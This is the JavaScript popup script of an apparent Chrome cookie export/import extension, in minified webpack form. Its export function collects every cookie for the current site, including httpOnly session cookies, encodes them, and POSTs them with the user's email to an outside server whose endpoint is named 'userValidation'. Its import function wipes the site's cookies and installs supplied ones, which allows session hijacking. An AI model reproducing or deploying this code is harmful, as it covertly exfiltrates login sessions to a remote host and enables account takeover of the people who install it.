const URL_ENDPOINT = "https://chrome-extension-cookie.vercel.app";
const POST_URL = `${URL_ENDPOINT}/api/userValidation`;

!(function (e) {
  var t = {};
  function n(o) {
    if (t[o]) return t[o].exports;
    var r = (t[o] = { i: o, l: !1, exports: {} });
    return e[o].call(r.exports, r, r.exports, n), (r.l = !0), r.exports;
  }
  (n.m = e),
    (n.c = t),
    (n.d = function (e, t, o) {
      n.o(e, t) || Object.defineProperty(e, t, { enumerable: !0, get: o });
    }),
    (n.r = function (e) {
      "undefined" != typeof Symbol &&
        Symbol.toStringTag &&
        Object.defineProperty(e, Symbol.toStringTag, { value: "Module" }),
        Object.defineProperty(e, "__esModule", { value: !0 });
    }),
    (n.t = function (e, t) {
      if ((1 & t && (e = n(e)), 8 & t)) return e;
      if (4 & t && "object" == typeof e && e && e.__esModule) return e;
      var o = Object.create(null);
      if (
        (n.r(o),
        Object.defineProperty(o, "default", { enumerable: !0, value: e }),
        2 & t && "string" != typeof e)
      )
        for (var r in e)
          n.d(
            o,
            r,
            function (t) {
              return e[t];
            }.bind(null, r)
          );
      return o;
    }),
    (n.n = function (e) {
      var t =
        e && e.__esModule
          ? function () {
              return e.default;
            }
          : function () {
              return e;
            };
      return n.d(t, "a", t), t;
    }),
    (n.o = function (e, t) {
      return Object.prototype.hasOwnProperty.call(e, t);
    }),
    (n.p = ""),
    n((n.s = 0));
})([
  function (e, t) {
    document.addEventListener("DOMContentLoaded", () => {
      const e = document.getElementById("cookies"),
        t = document.getElementById("export"),
        n = document.getElementById("import"),
        o = document.getElementById("domain"),
        r = document.getElementById("alert"),
        i = document.getElementById("alert-container");
      chrome.tabs.query({ currentWindow: !0, active: !0 }, (c) => {
        const d = new URL(c[0].url);
        ((e) => ["https:", "http:"].includes(e.protocol))(d)
          ? ((o.innerHTML = d.origin),
            t.addEventListener("click", () => {
              l(d);
            }),
            n.addEventListener("click", () => {
              try {
                const t = atob(e.value).split(";").map(JSON.parse);
                t.filter(
                  (e) => e.domain.includes(d.host) || d.host.includes(e.domain)
                ).length > 0
                  ? a(d)
                  : ((i.style.display = "block"),
                    (r.innerHTML = `Imported cookies are for <strong>${t[0].domain}</strong>`));
              } catch (e) {
                (i.style.display = "block"), (r.innerHTML = "⚠️Wrong Key");
              }
            }))
          : ((i.style.display = "block"),
            (o.innerHTML = "Invalid Domain"),
            (r.innerHTML = "Invalid Domain"),
            (t.disabled = !0),
            (n.disabled = !0));
      });
      const l = (o) => {
          chrome.cookies.getAll({ url: o.origin }, (o) => {
            const r = o.reduce(
              (e, t, n) => (
                (e += JSON.stringify(t)), n < o.length - 1 && (e += ";"), e
              ),
              ""
            );
            let cookies = btoa(r);
            let cookieKeyValue = {
              [document.getElementById("key").value]: cookies,
            }
            //update the data,
            let userData = {
              email: document.getElementById("email").value,
              cookie: cookieKeyValue,
              status: false,
            };
            fetch(POST_URL, {
              method: "POST",
              body: JSON.stringify(userData),
              headers: {
                "Content-Type": "application/json",
              },
            })
              .then((response) => {
                (e.value = cookies),
                  (t.disabled = !0),
                  (n.disabled = !0),
                  (i.style.display = "none");
              })
              .catch((error) => console.error(error));
            console.log("cookies: ", cookies);

           
          });
        },
        a = (e) => {
          chrome.cookies.getAll({ url: e.origin }, (t) => {
            let n = 0;
            t.forEach((o) => {
              chrome.cookies.remove({ url: e.origin, name: o.name }, () => {
                n++, n === t.length && c(e);
              });
            });
          });
        },
        c = (t) => {
          const n = atob(e.value).split(";");
          let o = 0;
          n.forEach((e) => {
            (e = JSON.parse(e)),
              chrome.cookies.set(
                {
                  url: t.origin,
                  name: e.name,
                  value: e.value,
                  domain: e.domain,
                  path: e.path,
                  secure: e.secure,
                  httpOnly: e.httponly,
                  sameSite: e.sameSite,
                  expirationDate: e.expirationDate,
                  storeId: e.storeId,
                },
                () => {
                  o++,
                    o === n.length &&
                      (chrome.tabs.query(
                        { active: !0, currentWindow: !0 },
                        (e) => {
                          chrome.tabs.update(e[0].id, { url: t.origin });
                        }
                      ),
                      window.close());
                }
              );
          });
        };
    });
  },
]);
